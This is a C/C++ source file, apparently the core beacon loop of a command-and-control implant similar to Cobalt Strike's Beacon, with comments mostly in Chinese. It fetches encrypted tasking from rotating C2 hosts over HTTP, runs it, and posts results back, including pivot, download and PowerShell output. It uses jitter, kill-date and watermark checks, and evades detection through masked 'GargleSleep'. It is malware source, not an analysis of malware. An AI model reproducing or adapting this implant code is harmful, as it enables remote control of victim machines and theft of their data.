#include "channel.h"
#include "commands.h"
#include "security.h"
#include "beacon.h"
#include "strategy.h"
#include "link.h"
#include "build.h"
#include "parse.h"
#include "bformat.h"
#include "track_memory.h"

#define MAX_GET setting_int(SETTING_MAXGET)

/* 默认，信标之间间隔1分钟 */
unsigned int sleep_time = 1000 * 30 * 1;

/* 信标的ID */
extern unsigned int agentid;

/* jitter，用于调整休眠时间的值 */
unsigned int jitter     = 0;

/* 用于发送数据的URL */
char         post_url[1024];

/* 用于发送的方式 */
unsigned int post_type = POST_HTTP;

/* base64编码的会话元数据信息 */
extern sessdata bigsession;

/* 决定是否需要执行POST */
extern int http_post_len;

void command_shell_post(char * buffer, int length, int type, BOOL sendNow) {
	DWORD bar = 0;

	/* 加密并打包数据 => 必须释放返回的指针 */
	char * cipherdata = command_shell_encrypt(buffer, length, type, &bar);
	if (bar <= 0)
		return;

	/* 处理发送 */
	if (post_type == POST_HTTP) {
		/* 只有HTTP发送支持响应队列。如果要求则绕过队列 */
		http_put(post_url, cipherdata, bar, sendNow);
	}

	/* 我（调用者）负责释放command_shell_encrypt指针！ */
	free(cipherdata);
}

void command_shell_callback(char * buffer, int length, int type) {
	BOOL   shouldChunk = setting_int(SETTING_C2_CHUNK_POST) > 0;

	/* 与分块阈值比较，如果需要则进行分块（仅限HTTP POST！） */
	if (post_type == POST_HTTP && shouldChunk) {
		command_shell_chunk_maybe(buffer, length, type);
	}
	/* 使用正常的数据发送路径（允许排队） */
	else {
		command_shell_post(buffer, length, type, FALSE);
	}
}

unsigned int genagentid() {
	return bigger_rand() & 0x7FFFFFFF & ~1;
}

void beacon(LPVOID lpReserved) {
	char * buffer;
	int    length;
	unsigned int adjust = 0;

	/* 一些元数据 */
	datap * blob          = data_alloc(256 + 128);  /* blob被跟踪 */
	char  * url           = data_ptr(blob, 256);
	char  * beacon_domain = data_ptr(blob, 128);
	int len = 128, ll = 1024;
	unsigned int signal;

	BOOL failedHost = FALSE;

	/* 我们的各种设置，需要从某处分配... */
	char * hosts              = setting_ptr(SETTING_DOMAINS);

	int    dns             = setting_short(SETTING_PROTOCOL) & ~BEACON_PROTO_HTTPS;
	int    port            = setting_short(SETTING_PORT);
	unsigned int sleepTime = setting_int(SETTING_SLEEPTIME);
	unsigned int dnsidle   = setting_int(SETTING_DNS_IDLE);
	char * ua              = setting_ptr(SETTING_USERAGENT);
	char * submit          = setting_ptr(SETTING_SUBMITURI);

	/* 跟踪最大重试策略的当前状态 */
	int maxRetryCount    = 0;
	unsigned int maxOrigSleepTime = 0;

	/* 栈上分配即可：strategy_setup 只填 4 个整数字段，strategyInfo 的生命周期与
	   本函数（beacon 主循环）一致，无需堆分配（确认原 TODO 的建议）。 */
	strategy_info strategyInfo;

	strategy_setup(
		&strategyInfo,
		setting_short(SETTING_DOMAIN_STRATEGY),
		setting_int(SETTING_DOMAIN_STRATEGY_SECONDS),
		setting_int(SETTING_DOMAIN_STRATEGY_FAIL_SECONDS),
		setting_int(SETTING_DOMAIN_STRATEGY_FAIL_X));

	// dlog("beacon.beacon - Host Initialization: strategy: '%d' rotation_timer: '%d' failover_timer: '%d' failover_maxfail: '%d' hosts: '%s' \n", strategyInfo->strategy, strategyInfo->rotation_timer, strategyInfo->failover_timer, strategyInfo->failover_maxfail, hosts);

	/* 跟踪blob以进行清理，跟踪blob-original以进行掩码处理 */
	track_memory_add(blob, sizeof(datap), TRACK_MEMORY_CLEANUP_FUNC, FALSE, reinterpret_cast<void (*)(void*)>(data_free));
	track_memory_add(blob->original, blob->size, TRACK_MEMORY_CLEANUP_FUNC, TRUE, NULL);

	/* 检查终止日期 */
	if (check_kill_date())
		safe_exit();

	/* 4.5+ - 验证水印 */
	if (bad_watermark())
		safe_exit();

	/* 4.5+ - 验证水印哈希 */
	if (bad_watermarkHash()) {
		// dlog("Bad Watermark Hash!");
		safe_exit();
	}

	/* 设置休眠时间 */
	sleep_time = sleepTime;

	/* 设置默认抖动因子 */
	jitter = setting_short(SETTING_JITTER);

	/* 分配缓冲区 */
	buffer = (char *)malloc(MAX_GET); /* 这在process_payload中被清除 */
	if (buffer == NULL) {
		safe_exit();
	}
	track_memory_add(buffer, MAX_GET, TRACK_MEMORY_MALLOC, FALSE, NULL);

	/* 初始化代理 */
	agent_init(buffer, MAX_GET);

	while (sleep_time > 0) {
		// dlog("beacon.beacon - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n");

		_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
		failedHost = FALSE;
		_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));

		/* 使用HTTP通信输出 */
		post_type = POST_HTTP;

		/* 创建URL */
		_snprintf(post_url, 256, "%s", submit);

		/* 执行协议的HTTP部分 */
		// dlog("beacon.beacon - http_init: %s \n", beacon_domain);
		http_init(beacon_domain, port, ua);

		// dlog("beacon.beacon - http_get: %s \n", url);
		length = http_get(url, &bigsession, buffer, MAX_GET);

		/* 这是在处理之前解密和验证有效载荷的适当时机 */
		if (length > 0) {
			/* 解密缓冲区 */
			// dlog("beacon.beacon - Decrypting payload length : %d \n", length);
			length = security_decrypt(buffer, length);
			if (length > 0) {
				// dlog("beacon.beacon - Response decrypted length: %d \n", length);
				process_payload(buffer, length);
			} else {
			    // CS-327: We were unable to decrypt/process the payload...
			    //         Consider as failed for host rotation...
	    		// dlog("beacon.beacon - Failed 200 response. Decrypted payload length = 0.\n");
	    		length = -1;
		    	failedHost = TRUE;
			}
		}
		// else {
			// 0 = standard 'nothing to do' response.
			// -1 = host failure.
			// anything else = wtf?
			// dlog("beacon.beacon - Response length = %d \n", length);
		// }

		/* 如果发生故障则返回-1，连接失败时不执行POST */
		if (length != -1) {
			// dlog("beacon.beacon - POSTing... \n");

			/* 检查我们的枢纽...看看是否有数据要报告 */
			pivot_poll(command_shell_callback);

			/* 当我们通过HTTP GET推送数据时，请限制下载速度！ */
			if (setting_int(SETTING_C2_CHUNK_POST) == 0)
				download_poll(command_shell_callback, MAX_PACKET);
			else
				download_poll(command_shell_callback, MAX_PACKET_DNS);

			/* 报告所有链接 */
			link_poll(command_shell_callback);

			/* 检查我们的powershell实例 */
			psh_poll(command_shell_callback, MAX_PACKET);

			/* 检查终止日期 */
			if (check_kill_date())
				command_die(command_shell_callback);

			/* 如果有任何内容要发送，现在就执行--一次性操作 */
			if (http_post_len > 0) {
				/* 使用新的HTTP连接--反正Web服务器会关闭连接 */
				http_close();
				http_init(beacon_domain, port, ua);

				/* 好，现在发送我们的数据 */
				http_post_maybe(post_url);
			}
		}
		else {
			// Connection Failed!
			// dlog("beacon.beacon - Connection Failed: Beacon Domain: %s \n", beacon_domain);
			failedHost = TRUE;
		}

		http_close();

		/* 再次检查终止日期 */
		if (check_kill_date())
			safe_exit();

		/* 检查最大重试策略，如果达到阈值则调整休眠时间 */
		if (check_max_retry(failedHost, &maxRetryCount, &sleep_time, &maxOrigSleepTime))
			safe_exit();

		/* 需要休眠多久？ */
		if (sleep_time > 0) {
			if (jitter == 0) {
				GargleSleep(sleep_time);
			}
			else {
			    unsigned int sxjd100 = ((sleep_time * jitter) / 100);
			    if (sxjd100 > 0) {
    				adjust = (bigger_rand() % sxjd100);
			    } else {
			        // when "sleep_time * jitter" is less than 100, sleep_time is too small to jitter.
    				adjust = 0;
			    }

    			// dlog("beacon.beacon - Ready to GargleSleep! Sleep Time: %u Jitter: %u Adjustment: %u sxjd100: %u \n", sleep_time, jitter, adjust, sxjd100);
				if (adjust < sleep_time) {
					GargleSleep(sleep_time - adjust);
				} else {
				    // Not sure how we got here, but we should probably still try to sleep...
					GargleSleep(sleep_time);
				}
			}
		}
	}

	/* 我们退出进程--以防止我们所在的进程"崩溃" */
	safe_exit();
}
